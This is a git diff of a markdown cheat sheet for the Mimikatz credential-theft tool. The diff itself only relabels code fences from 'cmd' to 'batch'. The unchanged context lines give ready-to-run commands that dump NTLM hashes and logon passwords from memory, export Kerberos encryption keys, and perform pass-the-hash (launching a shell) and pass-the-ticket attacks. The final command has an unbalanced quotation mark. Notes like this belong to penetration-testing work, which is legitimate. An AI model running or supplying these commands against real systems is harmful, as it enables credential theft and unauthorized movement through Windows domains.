@@ -19,7 +19,7 @@ Pre-built binaries available in the git repo: https://github.com/gentilkiwi/mimi
 **Website:** https://github.com/gentilkiwi/mimikatz
 ## Usage
 ### Obtaining Hashes & Tickets
-```cmd
+```batch
 # Obtain NTLM hashes for users
 C:\> mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
 
@@ -41,19 +41,19 @@ C:\> dir *.kirbi
 
 ### Exporting Kerberos Keys
 Keys are not the same as tickets, they are encryption keys that Kerberos uses for creating TGTs.
-```cmd
+```batch
 C:\> mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
 ```
 
 ### Pass-the-Hash
 Using the `sekurlsa::pth` module we can perform a pass-the-hash attack. It starts a process using the user's hash.
-```cmd
+```batch
 C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /NTLM:<hash> /domain:<AD_domain> /run:cmd.exe" exit
 ```
 > We can specify any program in the `/run:` flag to launch any program but a shell is often most useful.
 
 ### Pass the Ticket
 Using the `kerberos::ptt` module we can perform a pass-the-ticket attack using a `.kirbi` ticket file.
-```cmd
+```batch
 C:\> mimikatz.exe privilege::debug "kerberos::ptt <ticket_file> exit
 ```
